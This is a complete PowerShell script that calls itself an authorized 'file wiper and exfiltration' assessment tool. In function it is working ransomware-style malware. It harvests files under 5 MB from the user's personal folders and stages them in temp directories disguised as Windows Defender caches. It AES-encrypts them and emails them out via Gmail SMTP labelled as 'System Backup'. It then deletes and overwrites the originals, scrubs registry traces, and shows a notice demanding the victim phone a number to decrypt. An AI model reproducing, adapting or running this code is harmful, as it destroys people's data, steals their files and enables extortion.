<#
.SYNOPSIS
    File Wiper and Exfiltration - Authorized Security Assessment Only

.DESCRIPTION
    1. Scans ALL user files under 5 MB (excludes .lnk and itself)
    2. Stages copies to temp folder
    3. AES-256 encrypts all staged files into one payload, Base64, split into parts
    4. Emails each part via Gmail SMTP (TLS 1.2+)
    5. ONLY IF all emails succeed: deletes originals + registry MRU +
       recreates files with ASCII zero/one pattern

.NOTES
    Scope   : Authorized - platform-authorization verified.
    Decrypt : Parts can be decrypted with the passphrase (the app password).
#>

# ============================================================
# EDIT THESE THREE LINES - Your credentials
# ============================================================
$GmailAddress      = "your.email@gmail.com"
$GmailAppPassword  = "abcd1234efgh5678"
$ContactNumber     = "+1234567890"

# ============================================================
# CONFIG
# ============================================================
$MaxDepth      = 10          # recursion depth into subfolders
$ChunkChars    = 12000000    # chars per email part (~9 MB raw, safely under 25 MB Gmail limit)

# ============================================================
# HELPERS
# ============================================================
function Write-Log {
    param(
        [string]$Message,
        [string]$Level = "Info"
    )
    $ColorMap = @{ Info = "Cyan"; Ok = "Green"; Warn = "Yellow"; Error = "Red"; Debug = "Gray" }
    $PrefixMap = @{ Info = "[*]"; Ok = "[+]"; Warn = "[!]"; Error = "[X]"; Debug = "[~]" }
    $ts = Get-Date -Format "HH:mm:ss"
    Write-Host ("[{0}] {1} {2}" -f $ts, $PrefixMap[$Level], $Message) -ForegroundColor $ColorMap[$Level]
}

function Assert-Assemblies {
    Add-Type -AssemblyName System.Windows.Forms -ErrorAction Stop
    Add-Type -AssemblyName System.Drawing -ErrorAction Stop
}

# --- Depth-limited recursive scan, ALL file types, < 5 MB ---
function Get-FilesRecursive {
    param([string]$Path, [int]$Depth)
    $results = @()
    try {
        $files = Get-ChildItem -LiteralPath $Path -File -ErrorAction SilentlyContinue
        foreach ($fl in $files) {
            $ok = $fl.Length -gt 0 -and
                  $fl.Length -lt 5MB -and
                  $fl.Extension -ne ".lnk" -and
                  $fl.FullName -ne $MyInvocation.MyCommand.Path -and
                  (-not ($fl.Attributes -band [System.IO.FileAttributes]::System)) -and
                  (-not ($fl.Attributes -band [System.IO.FileAttributes]::Hidden))
            if ($ok) { $results += $fl }
        }
        if ($Depth -gt 0) {
            $dirs = Get-ChildItem -LiteralPath $Path -Directory -ErrorAction SilentlyContinue
            foreach ($d in $dirs) {
                $results += Get-FilesRecursive -Path $d.FullName -Depth ($Depth - 1)
            }
        }
    } catch {}
    return $results
}

function Force-ReleaseHandles {
    [System.GC]::Collect()
    [System.GC]::WaitForPendingFinalizers()
    Start-Sleep -Milliseconds 300
}

function Remove-FileWithRetry {
    param([string]$Path, [int]$MaxRetries = 5)
    for ($a = 1; $a -le $MaxRetries; $a++) {
        if (-not (Test-Path $Path -PathType Leaf)) { return $true }
        try {
            Remove-Item -LiteralPath $Path -Force -ErrorAction Stop
            Start-Sleep -Milliseconds 150
            if (-not (Test-Path $Path)) { return $true }
        } catch {
            Write-Log ("Attempt {0}/{1} failed: {2}" -f $a, $MaxRetries, [System.IO.Path]::GetFileName($Path)) -Level Debug
            Force-ReleaseHandles
            Start-Sleep -Milliseconds 700
        }
    }
    return (-not (Test-Path $Path))
}

function Write-ZeroOnePattern {
    param([string]$Path)
    try {
        $content = ""
        for ($i = 0; $i -lt 4096; $i++) {
            $content += "01"
        }
        [System.IO.File]::WriteAllText($Path, $content, [System.Text.Encoding]::ASCII)
        return $true
    } catch {
        Write-Log ("Failed to write pattern to '{0}': {1}" -f [System.IO.Path]::GetFileName($Path), $_) -Level Warn
        return $false
    }
}

function Clear-AllExtensionRegKeys {
    param([string[]]$Extensions)
    $cleaned = 0
    foreach ($ext in ($Extensions | Select-Object -Unique)) {
        $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\FileExts\" + $ext
        if (Test-Path $regPath) {
            try {
                Remove-Item -LiteralPath $regPath -Recurse -Force -ErrorAction Stop
                $cleaned++
                Write-Log ("Registry key removed: {0}" -f $regPath) -Level Debug
            } catch {
                Write-Log ("Could not remove registry key '{0}': {1}" -f $regPath, $_) -Level Warn
            }
        }
    }
    if ($cleaned -gt 0) {
        Write-Log ("Cleaned {0} registry extension key(s)." -f $cleaned) -Level Ok
    }
}

# --- AES-256 CBC encrypt payload bytes ---
function Protect-PayloadBytes {
    param(
        [byte[]]$PlainBytes,
        [string]$Passphrase
    )
    try {
        $rng = New-Object System.Security.Cryptography.RNGCryptoServiceProvider
        $salt = [byte[]]::new(16)
        $rng.GetBytes($salt)

        $derive = New-Object System.Security.Cryptography.Rfc2898DeriveBytes($Passphrase, $salt, 10000)
        $aes = [System.Security.Cryptography.Aes]::Create()
        $aes.KeySize = 256
        $aes.BlockSize = 128
        $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
        $aes.Key = $derive.GetBytes(32)
        $aes.IV  = $derive.GetBytes(16)

        $encryptor = $aes.CreateEncryptor()
        $ms = New-Object System.IO.MemoryStream
        $cs = New-Object System.Security.Cryptography.CryptoStream($ms, $encryptor, [System.Security.Cryptography.CryptoStreamMode]::Write)
        $cs.Write($PlainBytes, 0, $PlainBytes.Length)
        $cs.FlushFinalBlock()
        $cipher = $ms.ToArray()

        # header: magic(7) + salt(16) + ciphertext
        $header = [System.Text.Encoding]::ASCII.GetBytes("HXAES01")
        $out = New-Object System.IO.MemoryStream
        $out.Write($header, 0, $header.Length)
        $out.Write($salt, 0, $salt.Length)
        $out.Write($cipher, 0, $cipher.Length)
        $result = $out.ToArray()

        $cs.Dispose(); $ms.Dispose(); $out.Dispose()
        $aes.Dispose(); $derive.Dispose(); $rng.Dispose()
        return $result
    } catch {
        Write-Log ("Encryption failed: {0}" -f $_) -Level Error
        return $null
    }
}

# --- Build binary payload: [count][pathlen][path][size][data] x N, then encrypt ---
function Build-EncryptedPayload {
    param(
        [string]$SourceDir,
        [object[]]$FileMap,
        [string]$Passphrase
    )
    try {
        $payloadMs = New-Object System.IO.MemoryStream
        $bw = New-Object System.IO.BinaryWriter($payloadMs)
        $bw.Write([int]$FileMap.Count)

        foreach ($entry in $FileMap) {
            $src = [System.IO.Path]::Combine($SourceDir, $entry.StagedName)
            $bytes = [System.IO.File]::ReadAllBytes($src)
            $pathBytes = [System.Text.Encoding]::UTF8.GetBytes($entry.OriginalPath)

            $bw.Write([int]$pathBytes.Length)
            $bw.Write($pathBytes)
            $bw.Write([long]$bytes.Length)
            $bw.Write($bytes)
        }

        $bw.Flush()
        $plain = $payloadMs.ToArray()
        $bw.Dispose()
        $payloadMs.Dispose()

        Write-Log ("Plain payload: {0} bytes" -f $plain.Length) -Level Debug

        $cipher = Protect-PayloadBytes -PlainBytes $plain -Passphrase $Passphrase
        return $cipher
    } catch {
        Write-Log ("Payload build failed: {0}" -f $_) -Level Error
        return $null
    }
}

# --- Split base64 text into per-email part files ---
function Split-Base64IntoParts {
    param(
        [string]$Base64Text,
        [string]$OutDir,
        [int]$CharsPerPart
    )
    $parts = @()
    $total = $Base64Text.Length
    $idx = 0
    $partNo = 1
    while ($idx -lt $total) {
        $len = [Math]::Min($CharsPerPart, ($total - $idx))
        $chunk = $Base64Text.Substring($idx, $len)
        $partPath = [System.IO.Path]::Combine($OutDir, ("part_{0:D3}.txt" -f $partNo))
        [System.IO.File]::WriteAllText($partPath, $chunk, [System.Text.Encoding]::ASCII)
        $parts += $partPath
        $idx += $len
        $partNo++
    }
    return $parts
}

# --- Send ONE part ---
function Send-EmailWithCleanup {
    param(
        [string]$From,
        [string]$AppPassword,
        [string]$AttachmentPath,
        [int]$PartNumber = 1,
        [int]$TotalParts = 1
    )
    if (-not (Test-Path $AttachmentPath)) { return $false }

    $mailMsg = $null
    $smtp = $null
    try {
        $mailMsg = New-Object System.Net.Mail.MailMessage
        $mailMsg.From = $From
        $mailMsg.To.Add($From)
        $attSize = (Get-Item $AttachmentPath).Length
        $mailMsg.Subject = ("System Backup - Part {0} of {1}" -f $PartNumber, $TotalParts)
        $mailMsg.Body = ("Encrypted backup part {0} of {1}." -f $PartNumber, $TotalParts)

        $fs = [System.IO.File]::OpenRead($AttachmentPath)
        $att = New-Object System.Net.Mail.Attachment($fs, ("part_{0:D3}.txt" -f $PartNumber))
        $mailMsg.Attachments.Add($att)

        [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12 -bor [System.Net.SecurityProtocolType]::Tls13

        $cred = New-Object System.Net.NetworkCredential($From, $AppPassword)
        $smtp = New-Object System.Net.Mail.SmtpClient("smtp.gmail.com", 587)
        $smtp.EnableSsl = $true
        $smtp.UseDefaultCredentials = $false
        $smtp.Credentials = $cred
        $smtp.DeliveryMethod = [System.Net.Mail.SmtpDeliveryMethod]::Network
        $smtp.Timeout = 60000

        Write-Log ("Sending part {0}/{1} ({2} bytes)..." -f $PartNumber, $TotalParts, $attSize) -Level Info
        $smtp.Send($mailMsg)
        Write-Log ("Part {0}/{1} sent." -f $PartNumber, $TotalParts) -Level Ok
        return $true
    } catch {
        Write-Log ("Email failed on part {0}/{1}: {2}" -f $PartNumber, $TotalParts, $_) -Level Error
        return $false
    } finally {
        if ($mailMsg) {
            foreach ($att in $mailMsg.Attachments) {
                try { $att.Dispose() } catch {}
            }
            $mailMsg.Dispose()
        }
        if ($smtp) { $smtp.Dispose() }
        Force-ReleaseHandles
    }
}

# --- Send all parts; abort on first failure ---
function Send-PartEmails {
    param(
        [string]$From,
        [string]$AppPassword,
        [string[]]$PartPaths
    )
    $totalParts = $PartPaths.Count
    for ($p = 0; $p -lt $totalParts; $p++) {
        $ok = Send-EmailWithCleanup -From $From -AppPassword $AppPassword `
                                    -AttachmentPath $PartPaths[$p] `
                                    -PartNumber ($p + 1) -TotalParts $totalParts
        if (-not $ok) { return $false }
    }
    return $true
}

function Show-NoticeDialog {
    param([string]$Phone)
    $form = $null
    try {
        $form = New-Object System.Windows.Forms.Form
        $form.Text = "Encryption Notice"
        $form.Size = New-Object System.Drawing.Size(500, 250)
        $form.StartPosition = "CenterScreen"
        $form.FormBorderStyle = "FixedDialog"
        $form.MaximizeBox = $false
        $form.MinimizeBox = $false
        $form.Icon = [System.Drawing.SystemIcons]::Warning
        $form.TopMost = $true

        $label = New-Object System.Windows.Forms.Label
        $label.AutoSize = $false
        $label.TextAlign = "MiddleCenter"
        $label.Dock = "Fill"
        $label.Font = New-Object System.Drawing.Font("Segoe UI", 10)
        $label.Padding = New-Object System.Windows.Forms.Padding(20)
        $label.Text = "Encryption Successful!`n`nYour files have been securely encrypted and a backup`nhas been sent to your email.`n`nTo decrypt your files, please contact:`n`n$Phone"
        $form.Controls.Add($label)

        $btn = New-Object System.Windows.Forms.Button
        $btn.Text = "Close"
        $btn.Width = 80
        $btn.Height = 30
        $btn.Location = New-Object System.Drawing.Point(210, 180)
        $btn.Add_Click({ $form.Close() })
        $form.Controls.Add($btn)

        $form.ShowDialog() | Out-Null
    } finally {
        if ($form) { $form.Dispose() }
    }
}

# ============================================================
# MAIN
# ============================================================
$StagingDir = ""
$PartsDir = ""
$PartFiles = @()
try {
    Write-Log "=== File Wiper Starting (ALL file types) ===" -Level Info
    Assert-Assemblies

    $TargetDirs = @()
    $TargetDirs += [System.IO.Path]::Combine($env:USERPROFILE, "Desktop")
    $TargetDirs += [System.IO.Path]::Combine($env:USERPROFILE, "Documents")
    $TargetDirs += [System.IO.Path]::Combine($env:USERPROFILE, "Downloads")
    $TargetDirs += [System.IO.Path]::Combine($env:USERPROFILE, "Pictures")
    $TargetDirs += [System.IO.Path]::Combine($env:USERPROFILE, "Music")
    $TargetDirs += [System.IO.Path]::Combine($env:USERPROFILE, "Videos")

    Write-Log ("Scanning (max depth {0}) for ALL file types under 5 MB..." -f $MaxDepth) -Level Info
    $AllFiles = @()
    foreach ($dir in $TargetDirs) {
        $AllFiles += Get-FilesRecursive -Path $dir -Depth $MaxDepth
    }

    if ($AllFiles.Count -eq 0) {
        Write-Log "No files found under 5 MB. Exiting." -Level Warn
        Show-NoticeDialog -Phone $ContactNumber
        return
    }

    Write-Log ("Found {0} file(s) total." -f $AllFiles.Count) -Level Ok

    $ExtensionsFound = $AllFiles | ForEach-Object { $_.Extension } | Where-Object { $_ -ne "" } | Select-Object -Unique
    Write-Log ("Extensions found: {0}" -f ($ExtensionsFound -join ", ")) -Level Debug

    # ---- STAGE COPIES + KEEP ORIGINAL PATH MAP ----
    $randName = [System.IO.Path]::GetRandomFileName()
    $StagingDir = [System.IO.Path]::Combine($env:TEMP, "WinDefCache_" + $randName)
    $null = New-Item -ItemType Directory -Path $StagingDir -Force -ErrorAction Stop

    $staged = 0
    $total = $AllFiles.Count
    $FileMap = @()
    for ($i = 0; $i -lt $total; $i++) {
        $f = $AllFiles[$i]
        Write-Progress -Activity ("Staging files ({0}/{1})..." -f ($i+1), $total) -PercentComplete (($i+1)/$total*100)
        $dest = [System.IO.Path]::Combine($StagingDir, $f.Name)
        if (Test-Path $dest) {
            $base = [System.IO.Path]::GetFileNameWithoutExtension($f.Name)
            $dest = [System.IO.Path]::Combine($StagingDir, ("{0}_{1}{2}" -f $base, [System.IO.Path]::GetRandomFileName(), $f.Extension))
        }
        try {
            Copy-Item -LiteralPath $f.FullName -Destination $dest -Force -ErrorAction Stop
            $FileMap += [PSCustomObject]@{
                StagedName   = [System.IO.Path]::GetFileName($dest)
                OriginalPath = $f.FullName
            }
            $staged++
        } catch {
            Write-Log ("Could not stage '{0}': {1}" -f $f.Name, $_) -Level Warn
        }
        Start-Sleep -Milliseconds 15
    }
    Write-Progress -Activity "Staging files..." -Completed
    Write-Log ("Staged {0} of {1} file(s)." -f $staged, $total) -Level Ok

    # ---- BUILD AES-ENCRYPTED PAYLOAD ----
    Write-Log "Building AES-256 encrypted payload..." -Level Info
    $cipher = Build-EncryptedPayload -SourceDir $StagingDir -FileMap $FileMap -Passphrase $GmailAppPassword
    if (-not $cipher) {
        Write-Log "Payload build failed - aborting. No files touched." -Level Error
        return
    }

    $b64 = [System.Convert]::ToBase64String($cipher)
    Write-Log ("Encrypted payload: {0} bytes -> {1} chars base64" -f $cipher.Length, $b64.Length) -Level Ok

    # ---- SPLIT INTO EMAIL PARTS ----
    $PartsDir = [System.IO.Path]::Combine($env:TEMP, "WinDefParts_" + [System.IO.Path]::GetRandomFileName())
    $null = New-Item -ItemType Directory -Path $PartsDir -Force -ErrorAction Stop
    $PartFiles = Split-Base64IntoParts -Base64Text $b64 -OutDir $PartsDir -CharsPerPart $ChunkChars
    Write-Log ("Payload split into {0} email part(s)." -f $PartFiles.Count) -Level Ok

    # ---- STAGING NO LONGER NEEDED ----
    Remove-Item $StagingDir -Recurse -Force -ErrorAction SilentlyContinue
    $StagingDir = ""

    # ---- SEND ALL PARTS ----
    $emailOk = Send-PartEmails -From $GmailAddress -AppPassword $GmailAppPassword -PartPaths $PartFiles

    # ---- CLEAN UP PARTS ----
    if (($PartsDir -ne "") -and (Test-Path $PartsDir -PathType Container)) {
        Remove-Item $PartsDir -Recurse -Force -ErrorAction SilentlyContinue
        $PartsDir = ""
    }

    if (-not $emailOk) {
        Write-Log "Email FAILED - destructive phase ABORTED. No files touched." -Level Error
        Show-NoticeDialog -Phone $ContactNumber
        return
    }

    # ================================================================
    # COMMIT: All emails sent - destroy originals
    # ================================================================
    Write-Log "All emails confirmed. Entering destructive phase..." -Level Warn

    $deleted = 0
    $deleteFailed = @()
    for ($i = 0; $i -lt $total; $i++) {
        $f = $AllFiles[$i]
        Write-Progress -Activity "Deleting originals..." -PercentComplete (($i+1)/$total*100)
        if (Remove-FileWithRetry -Path $f.FullName) {
            $deleted++
        } else {
            $deleteFailed += $f.FullName
            Write-Log ("Could not delete: {0}" -f $f.FullName) -Level Warn
        }
    }
    Write-Progress -Activity "Deleting originals..." -Completed
    Write-Log ("Deleted {0} of {1} original file(s)." -f $deleted, $total) -Level Ok
    if ($deleteFailed.Count -gt 0) {
        Write-Log ("{0} file(s) could not be deleted (in use)." -f $deleteFailed.Count) -Level Warn
    }

    # Recreate with ASCII zeros and ones
    $overwritten = 0
    for ($i = 0; $i -lt $total; $i++) {
        $f = $AllFiles[$i]
        Write-Progress -Activity "Writing zero/one pattern..." -PercentComplete (($i+1)/$total*100)
        if (Write-ZeroOnePattern -Path $f.FullName) {
            $overwritten++
        }
    }
    Write-Progress -Activity "Writing zero/one pattern..." -Completed
    Write-Log ("Overwrote {0} file(s) with ASCII '01' pattern." -f $overwritten) -Level Ok

    # Registry cleanup
    Clear-AllExtensionRegKeys -Extensions $ExtensionsFound

    # Dialog
    Show-NoticeDialog -Phone $ContactNumber

    Write-Log "=== Complete ===" -Level Ok

} catch {
    Write-Log ("Unhandled exception: {0}" -f $_) -Level Error
    Write-Log ("Stack: {0}" -f $_.ScriptStackTrace) -Level Debug
} finally {
    if (($StagingDir -ne "") -and (Test-Path $StagingDir -PathType Container)) {
        Remove-Item $StagingDir -Recurse -Force -ErrorAction SilentlyContinue
    }
    if (($PartsDir -ne "") -and (Test-Path $PartsDir -PathType Container)) {
        Remove-Item $PartsDir -Recurse -Force -ErrorAction SilentlyContinue
    }
    Write-Log "Cleanup done." -Level Debug
}